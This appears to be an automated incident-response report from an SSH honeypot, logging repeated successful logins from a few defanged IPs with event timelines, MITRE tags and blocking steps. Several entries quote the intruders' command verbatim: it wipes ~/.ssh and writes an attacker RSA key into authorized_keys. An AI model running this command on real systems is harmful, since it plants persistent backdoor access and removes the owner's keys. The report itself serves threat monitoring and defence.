### 🔴 HIGH · IR-4a2a4e69beae

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:27 |
| **Last Seen** | 2026-05-26 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:27:44` | `cowrie.session.connect` |
| `2026-05-26 16:27:44` | `cowrie.client.version` |
| `2026-05-26 16:27:44` | `cowrie.client.kex` |
| `2026-05-26 16:27:45` | `cowrie.login.success` |
| `2026-05-26 16:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435570ada99f

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:29 |
| **Last Seen** | 2026-05-26 16:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:29:20` | `cowrie.session.connect` |
| `2026-05-26 16:29:20` | `cowrie.client.version` |
| `2026-05-26 16:29:21` | `cowrie.client.kex` |
| `2026-05-26 16:29:22` | `cowrie.login.success` |
| `2026-05-26 16:29:22` | `cowrie.session.params` |
| `2026-05-26 16:29:22` | `cowrie.command.input` |
| `2026-05-26 16:29:22` | `cowrie.command.failed` |
| `2026-05-26 16:29:22` | `cowrie.log.closed` |
| `2026-05-26 16:29:23` | `cowrie.session.params` |
| `2026-05-26 16:29:23` | `cowrie.command.input` |
| `2026-05-26 16:29:23` | `cowrie.session.file_download` |
| `2026-05-26 16:29:23` | `cowrie.log.closed` |
| `2026-05-26 16:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb6c39025daf

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:29 |
| **Last Seen** | 2026-05-26 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:29:26` | `cowrie.session.connect` |
| `2026-05-26 16:29:26` | `cowrie.client.version` |
| `2026-05-26 16:29:26` | `cowrie.client.kex` |
| `2026-05-26 16:29:27` | `cowrie.login.success` |
| `2026-05-26 16:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2177ffcf38

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:32 |
| **Last Seen** | 2026-05-26 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:32:53` | `cowrie.session.connect` |
| `2026-05-26 16:32:53` | `cowrie.client.version` |
| `2026-05-26 16:32:54` | `cowrie.client.kex` |
| `2026-05-26 16:32:55` | `cowrie.login.success` |
| `2026-05-26 16:32:55` | `cowrie.session.params` |
| `2026-05-26 16:32:55` | `cowrie.command.input` |
| `2026-05-26 16:32:55` | `cowrie.command.failed` |
| `2026-05-26 16:32:55` | `cowrie.log.closed` |
| `2026-05-26 16:32:56` | `cowrie.session.params` |
| `2026-05-26 16:32:56` | `cowrie.command.input` |
| `2026-05-26 16:32:56` | `cowrie.session.file_download` |
| `2026-05-26 16:32:56` | `cowrie.log.closed` |
| `2026-05-26 16:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0036b67b80e

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:32 |
| **Last Seen** | 2026-05-26 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:32:59` | `cowrie.session.connect` |
| `2026-05-26 16:32:59` | `cowrie.client.version` |
| `2026-05-26 16:32:59` | `cowrie.client.kex` |
| `2026-05-26 16:33:00` | `cowrie.login.success` |
| `2026-05-26 16:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f188d1b67db

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:33 |
| **Last Seen** | 2026-05-26 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:33:27` | `cowrie.session.connect` |
| `2026-05-26 16:33:27` | `cowrie.client.version` |
| `2026-05-26 16:33:27` | `cowrie.client.kex` |
| `2026-05-26 16:33:28` | `cowrie.login.success` |
| `2026-05-26 16:33:29` | `cowrie.session.params` |
| `2026-05-26 16:33:29` | `cowrie.command.input` |
| `2026-05-26 16:33:29` | `cowrie.command.failed` |
| `2026-05-26 16:33:29` | `cowrie.log.closed` |
| `2026-05-26 16:33:30` | `cowrie.session.params` |
| `2026-05-26 16:33:30` | `cowrie.command.input` |
| `2026-05-26 16:33:30` | `cowrie.session.file_download` |
| `2026-05-26 16:33:30` | `cowrie.log.closed` |
| `2026-05-26 16:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1218ba281e

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:33 |
| **Last Seen** | 2026-05-26 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:33:33` | `cowrie.session.connect` |
| `2026-05-26 16:33:33` | `cowrie.client.version` |
| `2026-05-26 16:33:33` | `cowrie.client.kex` |
| `2026-05-26 16:33:34` | `cowrie.login.success` |
| `2026-05-26 16:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f740b09b08

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:33 |
| **Last Seen** | 2026-05-26 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:33:58` | `cowrie.session.connect` |
| `2026-05-26 16:33:58` | `cowrie.client.version` |
| `2026-05-26 16:33:59` | `cowrie.client.kex` |
| `2026-05-26 16:34:00` | `cowrie.login.success` |
| `2026-05-26 16:34:00` | `cowrie.session.params` |
| `2026-05-26 16:34:00` | `cowrie.command.input` |
| `2026-05-26 16:34:00` | `cowrie.command.failed` |
| `2026-05-26 16:34:01` | `cowrie.log.closed` |
| `2026-05-26 16:34:01` | `cowrie.session.params` |
| `2026-05-26 16:34:01` | `cowrie.command.input` |
| `2026-05-26 16:34:01` | `cowrie.session.file_download` |
| `2026-05-26 16:34:01` | `cowrie.log.closed` |
| `2026-05-26 16:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f69f328f0f2e

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:34 |
| **Last Seen** | 2026-05-26 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:34:04` | `cowrie.session.connect` |
| `2026-05-26 16:34:04` | `cowrie.client.version` |
| `2026-05-26 16:34:05` | `cowrie.client.kex` |
| `2026-05-26 16:34:06` | `cowrie.login.success` |
| `2026-05-26 16:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346fefac0307

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:35 |
| **Last Seen** | 2026-05-26 16:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:35:43` | `cowrie.session.connect` |
| `2026-05-26 16:35:43` | `cowrie.client.version` |
| `2026-05-26 16:35:43` | `cowrie.client.kex` |
| `2026-05-26 16:35:45` | `cowrie.login.success` |
| `2026-05-26 16:35:45` | `cowrie.session.params` |
| `2026-05-26 16:35:45` | `cowrie.command.input` |
| `2026-05-26 16:35:45` | `cowrie.command.failed` |
| `2026-05-26 16:35:46` | `cowrie.log.closed` |
| `2026-05-26 16:35:46` | `cowrie.session.params` |
| `2026-05-26 16:35:46` | `cowrie.command.input` |
| `2026-05-26 16:35:46` | `cowrie.session.file_download` |
| `2026-05-26 16:35:46` | `cowrie.log.closed` |
| `2026-05-26 16:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5e71503dc9

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:35 |
| **Last Seen** | 2026-05-26 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:35:49` | `cowrie.session.connect` |
| `2026-05-26 16:35:49` | `cowrie.client.version` |
| `2026-05-26 16:35:50` | `cowrie.client.kex` |
| `2026-05-26 16:35:51` | `cowrie.login.success` |
| `2026-05-26 16:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16315d6db0b

| Field | Detail |
|---|---|
| **Source IP** | `120.1.87[.]115` |
| **First Seen** | 2026-05-26 16:49 |
| **Last Seen** | 2026-05-26 16:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:49:20` | `cowrie.session.connect` |
| `2026-05-26 16:49:20` | `cowrie.client.version` |
| `2026-05-26 16:49:20` | `cowrie.client.kex` |
| `2026-05-26 16:49:21` | `cowrie.login.success` |
| `2026-05-26 16:49:21` | `cowrie.session.params` |
| `2026-05-26 16:49:21` | `cowrie.command.input` |
| `2026-05-26 16:49:21` | `cowrie.command.failed` |
| `2026-05-26 16:49:21` | `cowrie.log.closed` |
| `2026-05-26 16:49:21` | `cowrie.session.params` |
| `2026-05-26 16:49:21` | `cowrie.command.input` |
| `2026-05-26 16:49:21` | `cowrie.session.file_download` |
| `2026-05-26 16:49:21` | `cowrie.log.closed` |
| `2026-05-26 16:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.1.87[.]115` to AbuseIPDB if not already reported
- [ ] Block `120.1.87[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42b42404494

| Field | Detail |
|---|---|
| **Source IP** | `120.1.87[.]115` |
| **First Seen** | 2026-05-26 16:49 |
| **Last Seen** | 2026-05-26 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:49:24` | `cowrie.session.connect` |
| `2026-05-26 16:49:24` | `cowrie.client.version` |
| `2026-05-26 16:49:24` | `cowrie.client.kex` |
| `2026-05-26 16:49:24` | `cowrie.login.success` |
| `2026-05-26 16:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.1.87[.]115` to AbuseIPDB if not already reported
- [ ] Block `120.1.87[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7257fdbeb2

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 16:58 |
| **Last Seen** | 2026-05-26 16:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:58:54` | `cowrie.session.connect` |
| `2026-05-26 16:58:54` | `cowrie.client.version` |
| `2026-05-26 16:58:54` | `cowrie.client.kex` |
| `2026-05-26 16:58:55` | `cowrie.login.success` |
| `2026-05-26 16:58:56` | `cowrie.session.params` |
| `2026-05-26 16:58:56` | `cowrie.command.input` |
| `2026-05-26 16:58:56` | `cowrie.command.failed` |
| `2026-05-26 16:58:57` | `cowrie.log.closed` |
| `2026-05-26 16:58:57` | `cowrie.session.params` |
| `2026-05-26 16:58:57` | `cowrie.command.input` |
| `2026-05-26 16:58:58` | `cowrie.session.file_download` |
| `2026-05-26 16:58:58` | `cowrie.log.closed` |
| `2026-05-26 16:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a7c629bd98

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 16:59 |
| **Last Seen** | 2026-05-26 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:59:01` | `cowrie.session.connect` |
| `2026-05-26 16:59:01` | `cowrie.client.version` |
| `2026-05-26 16:59:02` | `cowrie.client.kex` |
| `2026-05-26 16:59:03` | `cowrie.login.success` |
| `2026-05-26 16:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-032809bbe05e

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 16:59 |
| **Last Seen** | 2026-05-26 16:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:59:40` | `cowrie.session.connect` |
| `2026-05-26 16:59:40` | `cowrie.client.version` |
| `2026-05-26 16:59:40` | `cowrie.client.kex` |
| `2026-05-26 16:59:41` | `cowrie.login.success` |
| `2026-05-26 16:59:42` | `cowrie.session.params` |
| `2026-05-26 16:59:42` | `cowrie.command.input` |
| `2026-05-26 16:59:42` | `cowrie.command.failed` |
| `2026-05-26 16:59:43` | `cowrie.log.closed` |
| `2026-05-26 16:59:43` | `cowrie.session.params` |
| `2026-05-26 16:59:43` | `cowrie.command.input` |
| `2026-05-26 16:59:44` | `cowrie.session.file_download` |
| `2026-05-26 16:59:44` | `cowrie.log.closed` |
| `2026-05-26 16:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c42c92135f

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 16:59 |
| **Last Seen** | 2026-05-26 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:59:47` | `cowrie.session.connect` |
| `2026-05-26 16:59:47` | `cowrie.client.version` |
| `2026-05-26 16:59:48` | `cowrie.client.kex` |
| `2026-05-26 16:59:49` | `cowrie.login.success` |
| `2026-05-26 16:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6221acc4a1

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:01 |
| **Last Seen** | 2026-05-26 17:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
